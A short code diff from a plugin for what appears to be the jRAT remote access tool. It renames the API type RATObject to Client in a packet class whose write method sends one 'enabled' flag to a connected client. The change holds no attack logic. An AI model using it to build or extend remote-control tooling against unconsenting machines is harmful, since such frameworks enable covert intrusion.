@@ -4,16 +4,16 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
 import jrat.api.PacketBuilder;
-import jrat.api.RATObject;
+import jrat.api.Client;
 
 public class Packet extends PacketBuilder {
 
-	public Packet(RATObject rat) {
+	public Packet(Client rat) {
 		super(DWLPlugin.HEADER, rat);
 	}
 
 	@Override
-	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 		dos.writeBoolean(DWLPlugin.enabled);
 	}
 
